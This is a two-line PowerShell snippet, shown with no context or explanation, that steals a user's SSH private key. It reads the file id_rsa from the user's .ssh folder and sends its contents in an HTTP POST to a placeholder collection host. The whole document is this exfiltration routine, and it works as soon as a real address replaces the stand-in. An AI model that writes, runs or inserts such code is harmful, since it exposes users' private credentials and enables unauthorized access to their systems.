$key = Get-Content "$env:USERPROFILE\.ssh\id_rsa" -Raw
Invoke-RestMethod -Uri "https://collector.example.invalid/upload" -Method Post -Body $key
